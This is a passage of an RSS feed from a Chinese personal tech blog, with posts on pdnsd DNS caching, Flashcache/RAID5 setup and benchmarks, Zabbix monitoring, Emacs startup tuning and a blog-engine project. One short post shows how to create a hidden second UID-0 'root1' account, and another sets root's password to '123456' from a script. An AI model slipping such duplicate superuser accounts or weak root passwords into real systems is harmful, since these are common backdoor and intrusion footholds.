<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.info(<span style="color: #8abeb7;">"user saved"</span>);

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   User.find(user.id, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">user</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.quit();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(<span style="color: #8abeb7;">"user find error("</span> + err.toString() + <span style="color: #8abeb7;">")"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">"user found: "</span> + JSON.stringify(user));
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
});
</pre>
</div>

<p>
运行结果：
</p>

<div class="org-src-container">
<pre class="src src-js">user saved
user found: {<span style="color: #8abeb7;">"id"</span>:1,<span style="color: #8abeb7;">"name"</span>:<span style="color: #8abeb7;">"txf"</span>,<span style="color: #8abeb7;">"male"</span>:<span style="color: #81a2be;">true</span>,<span style="color: #8abeb7;">"birthday"</span>:<span style="color: #8abeb7;">"1983-03-22T00:00:00.000</span><span style="color: #8abeb7; text-decoration: underline;">Z"</span><span style="text-decoration: underline;">}</span>
</pre>
</div></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用Pdnsd缓存域名解析结果加快上网速度]]></title>
            <link>/article/4f7f7528-pdnsd-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html</link>
            <guid>/article/4f7f7528-pdnsd-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html</guid>
            <pubDate>Tue, 23 Jun 2015 10:56:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
频繁的域名解析容易导致超时出错
</p>

<p>
在执行 <code>opkg-cl update</code> 或 <code>yaourt -Syua</code> 命令更新系统软件信息时，容易因为频繁的域名解析而导致更新速度奇慢甚至是超时出错，通过将要访问的域名添加到 <code>/etc/hosts</code> 中，可以立即解决这个问题。考虑到服务器IP可能会换，使用 <code>/etc/hosts</code> 非长久之计。
</p></li>

<li><p>
缓存域名解析结果
</p>

<p>
更好的办法是缓存域名解析结果，一般来说后台服务程序可以通过缓存域名解析结果加快后继请求的处理，但是对于像 <code>opkg-cl</code> 、 <code>yaourt</code> 之类的工具程序，由于运行一次就退出了，要实现缓存域名解析结果就显得有点小题大作了，最好是在系统底层来实现，而不是每个应用程序都实现这个功能。
</p>

<p>
<a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 就是这样一款开源DNS代理服务程序，它安装在客户机上，对于客户端应用程序来说，它是DNS服务程序，对于真正的DNS服务来说它是DNS客户端程序。
</p></li>

<li><p>
<a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 安装
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S pdnsd
</pre>
</div></li>

<li><p>
<a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 运行
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo systemctl enable pdnsd
sudo systemctl start pdnsd
</pre>
</div></li>

<li><p>
客户机DNS设置
</p>

<p>
修改 <code>/etc/resolv.conf</code> 为如下内容：
</p>

<pre class="example">
nameserver 127.0.0.1
</pre>

<p>
对于 Archlinux <code>/etc/resolv.conf</code> 是由 <code>resolvconf</code> 工具生成，直接修改后随时可能被覆盖，可以修改 <code>/etc/resolvconf.conf</code> 将以下配置行取消注释：
</p>
<pre class="example">
# name_servers=127.0.0.1
</pre>

<p>
然后重新生成 <code>/etc/resolv.conf</code> 配置文件：
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo resolvconf -u
</pre>
</div></li>

<li><p>
看看效果
</p>

<p>
多次执行下面的命令，可以感觉到后几次明显比第一次快，这就是DNS缓存在起作用。
</p>

<div class="org-src-container">
<pre class="src src-sh">nslookup www.google.com
</pre>
</div></li>

<li><p>
适合国内环境的配置（仅供参考）
</p>

<p>
将 <code>/etc/pdnsd.conf</code> 配置文件修改为以下内容：
</p>

<pre class="example">
global {
    perm_cache=1024;
    cache_dir="/var/cache/pdnsd";
    pid_file = /var/run/pdnsd.pid;
    run_as="pdnsd";
    server_ip = 127.0.0.1;
    status_ctl = on;
    query_method=udp_tcp;
    min_ttl=15m;
    max_ttl=1d;
    timeout=10;
    neg_domain_pol=on;
    udpbufsize=1024;
}

server {
    label = "root-servers";
    root_server = discover;
    randomize_servers = on;
    ip = 114.114.114.114,
         223.5.5.5,
         114.114.115.115,
         223.6.6.6;
    timeout = 5;
    uptest = query;
    interval = 30m;
    ping_timeout = 50;
    purge_cache = off;
    exclude = .localdomain;
    policy = included;
    preset = off;
}

source {
    owner=localhost;
    serve_aliases=on;
    file="/etc/hosts";
}

rr {
    name=localhost;
    reverse=on;
    a=127.0.0.1;
    owner=localhost;
    soa=localhost,root.localhost,42,86400,900,86400,86400;
}
</pre>

<p>
重启 <a href="http://members.home.nl/p.a.rombouts/pdnsd/">Pdnsd</a> 生效配置：
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo systemctl restart pdnsd
</pre>
</div></li>

<li><p>
配置pdnsd使用dhcp分配的dns服务器
</p>

<p>
往往dhcp提供的dns服务器是最快的（它可能也做了缓存），用到了本地域名的情况下必须使用dhcp提供的dns服务器，
如果将dns服务器写死在pdnsd.conf，切换网络（如从公司回到家里）就上不了网了，其实 <code>resolvconf</code> 对 <code>pdnsd</code> 提供了支持。
</p>

<p>
参考 <code>man resolvconf</code> 将 <code>/etc/resolvconf.conf</code> 改为
</p>
<pre class="example">
name_servers=127.0.0.1
pdnsd_conf=/etc/pdnsd.conf
</pre>

<p>
删掉 <code>/etc/pdnsd.conf</code> 中的所有 <code>server</code> 配置块。
</p>

<p>
重启 <code>NetworkManager</code> 生效配置
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo systemctl restart NetworkManager
</pre>
</div>

<p>
现在 <code>/etc/pdnsd.conf</code> 中的 <code>server</code> 配置块将由 <code>resolvconf</code> 来提供。
</p></li>

<li><p>
参考
</p>

<p>
《<a href="http://venmos-com.qiniudn.com/blog/2013/06/19/pdnsd/">用Pdnsd快速打造无污染高速缓存DNS服务器</a>》</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux非交互方式修改用户密码]]></title>
            <link>/article/linux-975e4ea44e9265b95f0f4fee6539752862375bc67801.html</link>
            <guid>/article/linux-975e4ea44e9265b95f0f4fee6539752862375bc67801.html</guid>
            <pubDate>Tue, 16 Jun 2015 09:35:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
linux下的 <code>passwd</code> 命令是交互式运行的（密码需要由用户使用键盘输入），后台程序如果要改用户密码需要一定的技巧。
</p>

<p>
如：以下命令可以将 <code>root</code> 帐号的密码改为 <code>123456</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">(<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'123456'</span>; sleep 1; <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'123456'</span>) | passwd <span style="color: #8abeb7;">'root'</span> &gt; /dev/null
</pre>
</div>

<p>
但是，此时也不好判断密码是否改成功了，需要验证一下。
</p>

<p>
linux 系统的密码编码（不可逆）后存储在 /etc/shadow（以前是 /etc/passwd） 文件里。
</p>

<p>
参考文章《<a href="http://www.xinotes.net/notes/note/1833/">Check Linux user password in C</a> 》编写了以下程序用于非交互式修改密码：
</p>

<p>
<a href="../static/change_password.c">change_password.c</a>
</p>

<p>
编译：
</p>
<div class="org-src-container">
<pre class="src src-sh">gcc -g change_password.c -o change_password -lcrypt
</pre>
</div>

<p>
运行：
</p>
<div class="org-src-container">
<pre class="src src-sh">./change_password root 123456
</pre>
</div>

<p>
参考：
</p>

<ul class="org-ul">
<li><a href="http://tldp.org/HOWTO/Shadow-Password-HOWTO-2.html">Why shadow your passwd file?</a></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[ediary支持主页以及完成国际化（i18n）支持]]></title>
            <link>/article/ediary-652f63014e3b98754ee553ca5b8c621056fd96455316ff08-i18n-ff09652f6301.html</link>
            <guid>/article/ediary-652f63014e3b98754ee553ca5b8c621056fd96455316ff08-i18n-ff09652f6301.html</guid>
            <pubDate>Tue, 09 Jun 2015 07:04:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
完成主页支持
</p>

<p>
通过在配置文件中添加主页选项 <code>config.site.home</code> ，支持把某一个页面通过拷贝做为主页 <code>/index.html</code> 。
</p></li>

<li><p>
完成国际化支持
</p>

<p>
按照文章 <a href="https://research.linagora.com/blog/?p=37">A strategy for i18n in node.js server templates</a> 的建议，选用 <a href="https://github.com/mashpie/i18n-node">i18n-node</a> 做为国际化方案，顺利完成英文及中文简体的支持。
</p></li>
</ul>

<p>
接下来要简化安装配置，并提供相关文档。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[ediary已基本可用正式在个人博客中启用]]></title>
            <link>/article/ediary-5df257fa672c53ef75286b635f0f57284e2a4eba535a5ba24e2d542f7528.html</link>
            <guid>/article/ediary-5df257fa672c53ef75286b635f0f57284e2a4eba535a5ba24e2d542f7528.html</guid>
            <pubDate>Mon, 08 Jun 2015 03:39:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
经过上周末的一翻努力，参考 <a href="http://medium.com/">medium</a> 的风格，对布局进行彻底的调整：
</p>

<ul class="org-ul">
<li>使用三层组织方式：category &gt; tag &gt; article</li>

<li>article 去除干扰阅读的元素：标签云，网址中去除了时间信息</li>

<li>category 放到一级菜单中，支持按 category 订阅</li>

<li>移植 o-blog 中的sitemap功能</li>
</ul>

<p>
接下来的任务是对主页进行正式支持，目前是手工拷贝了 category 的第一页做为首页，后面需要改为直接把 category 的第一页发布为首页，以及显示方面的BUG修复。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下创建另一个root帐号]]></title>
            <link>/article/linux-4e0b521b5efa53e64e004e2a-root-5e1053f7.html</link>
            <guid>/article/linux-4e0b521b5efa53e64e004e2a-root-5e1053f7.html</guid>
            <pubDate>Thu, 04 Jun 2015 12:27:00 GMT</pubDate>
            <content:encoded><![CDATA[<div class="org-src-container">
<pre class="src src-sh">useradd -g 0 -u 0 -o root1
</pre>
</div>

<p>
上面的命令创建了一个和 <code>root</code> 帐号几乎一模一样的帐号 <code>root1</code> ，这个帐号登录后甚至连 <code>$USER</code> 环境变量都是 <code>root=， 应该是由于 =uid</code> 和 <code>root</code> 帐号一样都是 <code>0</code> ，所以使用了 <code>root</code> 帐号的用户名，但是可以指定不同的 <code>HOME</code> 以及密码等。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[第二个任务以及移植 o-blog 主要功能顺利完成]]></title>
            <link>/article/7b2c4e8c4e2a4efb52a14ee553ca79fb690d-o-blog-4e3b8981529f80fd987a52295b8c6210.html</link>
            <guid>/article/7b2c4e8c4e2a4efb52a14ee553ca79fb690d-o-blog-4e3b8981529f80fd987a52295b8c6210.html</guid>
            <pubDate>Wed, 03 Jun 2015 06:45:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
o-blog 的相关特性进行了一番取舍：去掉了云标签独立页面，去掉了年/月发布列表页，去掉了最新文章侧边栏，去掉了文章页面的上一文章、下一文章链接，以及选择直接在标签侧边栏高亮相关标签，新增按标签订阅，新增主页。
</p>

<p>
接下来还有首页的页面需要按时间顺序排列，另外最好1号页码表示最旧的文章，这样发表新文章后文章所在的页码不会变来变去不利于收藏。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[第一个任务解析日志文件顺利完成]]></title>
            <link>/article/7b2c4e004e2a4efb52a189e3679065e55fd765874ef6987a52295b8c6210.html</link>
            <guid>/article/7b2c4e004e2a4efb52a189e3679065e55fd765874ef6987a52295b8c6210.html</guid>
            <pubDate>Sat, 30 May 2015 08:58:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
参考 <a href="https://github.com/renard/o-blog">o-blog</a> 的代码顺利完成任务，代码量很少不到40行。貌似 o-blog 很多解析org-mode的代码都是手写的，org-mode 支持一些便捷的API，可以减少很多代码量。
</p>

<p>
接下来要完的任务是org-mode格式的日记内容html化。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[今天开始ediary项目]]></title>
            <link>/article/4eca59295f0059cb-ediary-987976ee.html</link>
            <guid>/article/4eca59295f0059cb-ediary-987976ee.html</guid>
            <pubDate>Sat, 30 May 2015 07:26:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
又折腾了一上午的 <a href="https://github.com/renard/o-blog">o-blog</a> ，总是少了几个 <code>js</code> 文件，最近升级了 <code>emacs</code> 中的所有包后 <a href="http://blog.kankanan.com">我的博客</a> 总算是歇菜了，使用 <a href="https://github.com/renard/o-blog">o-blog</a> 写了两年博客，过程还是很愉快的，除了升级系统后偶尔会有兼容性问题，需要耗费时间修复外，写起博客来很方便，有时候工作相关的调研项目也忍不住发布到博客上，然后把链接发出去。不过考虑到我使用的系统（Archlinux）更新得太勤快了，使用的博客系统一定要够简单直观，我可以改得动。
</p>

<p>
我想是时候按自已的想法写一个类似的项目了，这个项目的核心功能一定要精简，专注于日记功能，最好能把展示层剥离出去， <code>jquery</code> 和 <code>bootstrap</code> 实在是太重了，展示日志用得着这么重的东西吗？
</p>

<p>
核心应该是数据结构，日志的信息包含：标题（title）、标签（tags）、发布日期（timestamp）、正文（source）加上可选的短名称（slug）用于生成链接。而最基础的功能就是从日志文本中提取这些信息。接下来根据这些信息来生成待发布的日志文件，以及与现有的发布系统（如：wordpress、git pages）的对接就可以独立进行开发了，而且应该可以互相替换。
</p>

<p>
接下来要完成的第一个任务就是解析本日志文件。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Zabbix添加Flashcache监控]]></title>
            <link>/article/zabbix-6dfb52a0-flashcache-76d163a7.html</link>
            <guid>/article/zabbix-6dfb52a0-flashcache-76d163a7.html</guid>
            <pubDate>Fri, 29 May 2015 08:27:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org5ebd79a" class="outline-2">
<h2 id="org5ebd79a">下载 <code>Zabbix</code> 的 <code>Flashcache</code> 开源模板</h2>
<div class="outline-text-2" id="text-org5ebd79a">
<div class="org-src-container">
<pre class="src src-sh">git clone https://github.com/lesovsky/zabbix-extensions.git
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd697c28" class="outline-2">
<h2 id="orgd697c28">设置 <code>zabbix_agentd</code></h2>
<div class="outline-text-2" id="text-orgd697c28">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#23433;&#35013;&#37197;&#32622;&#25991;&#20214;</span>
cp zabbix-extensions/files/flashcache/flashcache.conf /usr/local/etc/zabbix_agen<span style="text-decoration: underline;">td.conf.d/</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#23433;&#35013;&#33050;&#26412;</span>
mkdir /usr/local/etc/zabbix_scripts
cp zabbix-extensions/files/flashcache/scripts/* /usr/local/etc/zabbix_scripts/
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#20462;&#25913;&#37197;&#32622;&#25991;&#20214;&#20013;&#24341;&#29992;&#30340;&#33050;&#26412;&#36335;&#24452;</span>
sed --in-place -e <span style="color: #8abeb7;">'s/\/usr\/libexec\/zabbix-extensions\//\/usr\/local\/etc\/zabb</span><span style="color: #8abeb7; text-decoration: underline;">ix_/g'</span><span style="text-decoration: underline;"> /usr/local/etc/zabbix_agentd.conf.d/flashcache.conf</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#21253;&#21547;&#37197;&#32622;&#25991;&#20214;&#30446;&#24405;</span>
sed --in-place -e <span style="color: #8abeb7;">'s/# Include=\/usr\/local\/etc\/zabbix_agentd\.conf\.d\//Inclu</span><span style="color: #8abeb7; text-decoration: underline;">de=\/usr\/local\/etc\/zabbix_agentd\.conf\.d\//g'</span><span style="text-decoration: underline;"> /usr/local/etc/zabbix_agentd.conf</span>
</pre>
</div>

<p>
重启 <code>zabbix_agentd</code> 生效配置。
</p>
</div>
</div>

<div id="outline-container-orgba54346" class="outline-2">
<h2 id="orgba54346">设置 <code>Zabbix</code> 后台</h2>
<div class="outline-text-2" id="text-orgba54346">
<ul class="org-ul">
<li><p>
导入 <code>Flashcache</code> 模板
</p>

<p>
Configuration -&gt; Templates -&gt; Import -&gt; Import file 选择之前下载的 <code>zabbix-extensions/files/flashcache/flashcache-template.xml</code>
</p></li>

<li><p>
应用 <code>Flashcache</code> 模板
</p>

<p>
Configuration -&gt; Hosts 下选择要应用到的主机 -&gt; Templates -&gt; Link new templates 选择 <code>Flashcache-Template</code></p></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[emacs启动速度优化]]></title>
            <link>/article/emacs-542f52a8901f5ea64f185316.html</link>
            <guid>/article/emacs-542f52a8901f5ea64f185316.html</guid>
            <pubDate>Sun, 24 May 2015 03:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
emacs装了很多插件后，启动越来越慢了，最近发现启动一次要25秒，赶得上操作系统启动时间了，是时候优化一下启动速度了。
</p>

<ul class="org-ul">
<li><p>
裸启动emacs
</p>

<div class="org-src-container">
<pre class="src src-sh">emacs --quick
</pre>
</div>

<p>
尽然耗时10秒，网上查了一下这个问题常见于 <code>archlinux</code> ，是网络配置引起: <a href="https://wiki.archlinux.org/index.php/Emacs#Incorrect_network_configuration">Emacs - Slow startup - Incorrect network configuration</a>
</p>

<p>
解决方案就是将主机名（ <code>hostname</code> 命令输出）加到 <code>/etc/hosts</code> 中：
</p>

<pre class="example">
127.0.0.1   localhost.localdomain   localhost &lt;hostame&gt;
::1     localhost.localdomain   localhost  &lt;hostname&gt;
</pre>

<p>
再试，emacs瞬间启动。
</p></li>

<li><p>
不加载个人配置文件启动emacs
</p>

<div class="org-src-container">
<pre class="src src-sh">emacs --no-init-file
</pre>
</div>

<p>
emacs瞬间启动。
</p></li>

<li><p>
不加载最近保存的桌面启动emacs
</p>

<div class="org-src-container">
<pre class="src src-sh">emacs --no-desktop
</pre>
</div>

<p>
耗时15秒，看来是个人配置的问题了
</p></li>

<li><p>
从前面开始一块一块反注释emacs配置，看是卡在哪里
</p>

<div class="org-src-container">
<pre class="src src-lisp">(<span style="color: #b5bd68;">require</span> '<span style="color: #81a2be;">anything-config</span>)
</pre>
</div>

<p>
这一句耗时11秒，注释掉，现在启时时间为5秒，可以接受了。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Flashcache优化]]></title>
            <link>/article/flashcache-4f185316.html</link>
            <guid>/article/flashcache-4f185316.html</guid>
            <pubDate>Fri, 22 May 2015 10:12:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
调整 dev.flashcache.&lt;cache name&gt;.dirty_thresh_pct
</p>

<p>
脏缓存回写阈值（百分比），默认 <code>20</code> 。
</p>

<p>
仅 <code>Write-Back</code> 模式下有效。
</p>

<p>
调大该值可以减轻写压力（缓存数据写入HDD及元数据写入SSD），缓存已满时该缓存块不能被淘汰，减少了可用缓存空间。
</p>

<p>
如果最近写入的数据很可能是热数据，可以考虑调大该值，建议调到 <code>90</code> ：
</p>

<div class="org-src-container">
<pre class="src src-sh">sysctl -w dev.flashcache.&lt;cache name&gt;.dirty_thresh_pct=90
</pre>
</div></li>

<li><p>
调整 dev.flashcache.reclaim_policy
</p>

<p>
缓存空间回收策略，默认 <code>FIFO(0)</code> 。
</p>

<p>
改为 <code>LRU(1)</code> :
</p>

<div class="org-src-container">
<pre class="src src-sh">sysctl -w dev.flashcache.&lt;cache name&gt;.reclaim_policy=1
</pre>
</div></li>

<li>辅助调试

<ul class="org-ul">
<li><p>
统计清零
</p>

<div class="org-src-container">
<pre class="src src-sh">sysctl -w dev.flashcache.&lt;cache name&gt;.zero_stats=1
</pre>
</div></li>

<li><p>
快速停止
</p>

<p>
Flashcache在停止时会将SSD中的脏数据写回到HDD中，这是非常耗时的，会导致关机慢。
</p>

<p>
手工快速停止
</p>

<div class="org-src-container">
<pre class="src src-sh">service flashcache forcestop
</pre>
</div>

<p>
总是快速停止
</p>

<div class="org-src-container">
<pre class="src src-sh">sysctl -w dev.flashcache.sdb+sdc1.fast_remove=1
</pre>
</div></li>
</ul></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[FlashCache多盘方案实战]]></title>
            <link>/article/flashcache-591a76d865b968485b9e6218.html</link>
            <guid>/article/flashcache-591a76d865b968485b9e6218.html</guid>
            <pubDate>Wed, 29 Apr 2015 09:38:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
目标系统为单SSD+多HDD，将多HDD创建为RAID5逻辑盘，然后使用FlashCache将SSD做为RAID5逻辑盘的缓存。
</p>

<div id="outline-container-orga654f9a" class="outline-2">
<h2 id="orga654f9a">系统信息</h2>
<div class="outline-text-2" id="text-orga654f9a">
<ul class="org-ul">
<li><p>
OS
</p>

<p>
CentOS release 6.5 (Final) x86_64
</p></li>

<li><p>
CPU
</p>

<p>
8
</p>

<p>
Intel(R) Atom(TM) CPU  C2750  @ 2.40GHz
</p></li>

<li><p>
MEMORY
</p>

<p>
4
</p>

<p>
TOTAL 16G
</p></li>

<li><p>
HDD
</p>

<p>
4
</p>

<p>
WDC WD4000FYYZ-0 4TB 7200转
</p>

<p>
/dev/sdc /dev/sdd /dev/sde /dev/sdf
</p></li>

<li><p>
SSD
</p>

<p>
1
</p>

<p>
INTEL SSDSC2BB30 300GB
</p>

<p>
/dev/sdb
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org89c9b7b" class="outline-2">
<h2 id="org89c9b7b">卸载HDD及SSD盘</h2>
<div class="outline-text-2" id="text-org89c9b7b">
<div class="org-src-container">
<pre class="src src-sh">umount /dev/sdc /dev/sdd /dev/sde /dev/sdf /dev/sdb
</pre>
</div>

<p>
确保系统重启后不会自动挂载这些盘。
</p>
</div>
</div>

<div id="outline-container-orgdcc0746" class="outline-2">
<h2 id="orgdcc0746">将多HDD创建为RAID5逻辑盘</h2>
<div class="outline-text-2" id="text-orgdcc0746">
<ul class="org-ul">
<li><p>
格式化HDD盘
</p>

<div class="org-src-container">
<pre class="src src-sh">parted /dev/sdc
(parted) mklabel gpt
(parted) unit TB
(parted) mkpart primary 0.00TB 4.00TB
(parted) print
</pre>
</div>

<p>
其它HDD盘也做如上处理.
</p></li>

<li><p>
创建RAID5逻辑分区
</p>

<div class="org-src-container">
<pre class="src src-sh">mdadm --create /dev/md0 --level=raid5 --raid-devices=4 /dev/sd[c-f]1
parted /dev/md0
(parted) mklabel gpt
(parted) unit TB
(parted) mkpart primary 0.00TB 12.00TB
(parted) print
(parted) quit
</pre>
</div></li>

<li><p>
保存RAID5配置
</p>

<div class="org-src-container">
<pre class="src src-sh">mdadm --detail --scan &gt; /etc/mdadm.conf
</pre>
</div>

<p>
参考：<a href="https://raid.wiki.kernel.org/index.php/RAID_setup#Saving_your_RAID_configuration">Saving your RAID configuration</a>
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org10c5ffe" class="outline-2">
<h2 id="org10c5ffe">安装Flashcache</h2>
<div class="outline-text-2" id="text-org10c5ffe">
<div class="org-src-container">
<pre class="src src-sh">wget https://github.com/facebook/flashcache/archive/stable_v3.1.3.zip -O flashca<span style="text-decoration: underline;">che_stable_v3.1.3.zip</span>
unzip flashcache_stable_v3.1.3.zip
<span style="color: #b294bb;">cd</span> flashcache-stable_v3.1.3
make
make install
modprobe flashcache
</pre>
</div>
</div>
</div>

<div id="outline-container-org62a0c4c" class="outline-2">
<h2 id="org62a0c4c">创建Flashcache混合设备</h2>
<div class="outline-text-2" id="text-org62a0c4c">
<div class="org-src-container">
<pre class="src src-sh">flashcache_create -p around cachedev /dev/sdb /dev/md0p1
mkfs.ext4 /dev/mapper/cachedev
</pre>
</div>
</div>
</div>

<div id="outline-container-orga0fecdc" class="outline-2">
<h2 id="orga0fecdc">挂载Flashcache混合设备</h2>
<div class="outline-text-2" id="text-orga0fecdc">
<div class="org-src-container">
<pre class="src src-sh">mkdir /data
mount /dev/mapper/cachedev /data
</pre>
</div>
</div>
</div>

<div id="outline-container-orga36464a" class="outline-2">
<h2 id="orga36464a">系统重启后需要重新创建并挂载Flashcache设备</h2>
<div class="outline-text-2" id="text-orga36464a">
<div class="org-src-container">
<pre class="src src-sh">flashcache_create -p around cachedev /dev/sdb /dev/md0p1
mount /dev/mapper/cachedev /data
</pre>
</div>

<p>
注意：使用除 <code>writethrough</code> 和 <code>writearound</code> 以外的模式需要使用 <code>flashcache_load</code> 重新创建设备。
</p>
</div>
</div>

<div id="outline-container-orgc675a08" class="outline-2">
<h2 id="orgc675a08">写入速度测试</h2>
<div class="outline-text-2" id="text-orgc675a08">
<p>
循环创建60MiB大小的文件，测得的磁盘写入速度为 <b>35.6MiB</b> ，磁盘读取速度为 <b>2.1MiB</b> 。
</p>
</div>
</div>

<div id="outline-container-orge6c3490" class="outline-2">
<h2 id="orge6c3490">读取速度测试</h2>
<div class="outline-text-2" id="text-orge6c3490">
<ul class="org-ul">
<li>500并发120G文件每次读取32KB顺序读取

<ul class="org-ul">
<li><p>
请求处理速度
</p>

<p>
2107
</p></li>

<li><p>
传输速度
</p>

<p>
132.35MiB/s
</p></li>
</ul></li>

<li>500并发500G文件每次读取32KB顺序读取

<ul class="org-ul">
<li><p>
请求处理速度
</p>

<p>
1937
</p></li>

<li><p>
传输速度
</p>

<p>
61.09MiB
</p></li>
</ul></li>

<li>500并发1T文件每次读取32KB顺序读取

<ul class="org-ul">
<li><p>
请求处理速度
</p>

<p>
1574
</p></li>

<li><p>
传输速度
</p>

<p>
49.64MiB/s
</p></li>
</ul></li>

<li>500并发120G文件每次读取64KB顺序读取

<ul class="org-ul">
<li><p>
请求处理速度
</p>

<p>
5006
</p></li>

<li><p>
传输速度
</p>

<p>
157.88MiB/s
</p></li>
</ul></li>

<li>500并发500G文件每次读取64KB顺序读取

<ul class="org-ul">
<li><p>
请求处理速度
</p>

<p>
897
</p></li>

<li><p>
传输速度
</p>

<p>
56.37MiB/s
</p></li>
</ul></li>

<li>500并发1T文件每次读取64KB顺序读取

<ul class="org-ul">
<li><p>
请求处理速度
</p>

<p>
782
</p></li>

<li><p>
传输速度
</p>

<p>
49.10MiB/s
</p></li>
</ul></li>
</ul>
</div>
</div>

<div id="outline-container-org12791e3" class="outline-2">
<h2 id="org12791e3">注意事项</h2>
<div class="outline-text-2" id="text-org12791e3">
<ul class="org-ul">
<li><p>
重建（rebuild）
</p>

<p>
当一块盘坏掉后，如果配置了热备盘（Hot spare disk），会自动重建，请将坏盘换掉并配置成热备盘；\
如果未配置热备盘，读性能会下降（坏盘中的数据需要全部通过计算重现），请将坏盘换掉系统会自动进行重建。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org0c057bc" class="outline-2">
<h2 id="org0c057bc">潜在的优化选项</h2>
<div class="outline-text-2" id="text-org0c057bc">
<ul class="org-ul">
<li>开启SSD写Cache</li>

<li><p>
禁用文件、目录访问时间戳
</p>

<p>
noatime,nodiratime
</p></li>

<li><p>
<code>Write-Back</code> 模式优化
</p>

<div class="org-src-container">
<pre class="src src-sh">sysctl -w dev.flashcache.sdb+md0p1.dirty_thresh_pct=80
</pre>
</div></li>
</ul>
</div>
</div>


<div id="outline-container-orgca43c66" class="outline-2">
<h2 id="orgca43c66">卸载Flashcache设备</h2>
<div class="outline-text-2" id="text-orgca43c66">
<div class="org-src-container">
<pre class="src src-sh">umount /dev/mapper/cachedev
dmsetup remove cachedev
</pre>
</div>
</div>
</div>

<div id="outline-container-org0fb5836" class="outline-2">
<h2 id="org0fb5836">Q&amp;A</h2>
<div class="outline-text-2" id="text-org0fb5836">
<ul class="org-ul">
<li><p>
重新调整 Flashcache 选项会不会删除数据？
</p>

<p>
<code>writethrough</code> 、 <code>writearound</code> 模式不会，其它的会。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org075c61e" class="outline-2">
<h2 id="org075c61e">相关参考</h2>
<div class="outline-text-2" id="text-org075c61e">
<dl class="org-dl">
<dt>《<a href="http://lzw.me/a/linux-lvm.html">Linux LVM逻辑卷管理详细介绍</a>》</dt><dd>非常好的LVM入门文章</dd>

<dt>《<a href="http://www.linux-mag.com/id/7582/">Pick Your Pleasure: RAID-0 mdadm Striping or LVM Striping?</a>》</dt><dd>LVM与RAID-0的比较</dd>

<dt>《<a href="http://www.tecmint.com/create-raid0-in-linux/">Creating Software RAID0 (Stripe) on ‘Two Devices’ Using ‘mdadm’ Tool in Linux – Part 2</a>》</dt><dd>构建RAID-0教程</dd>

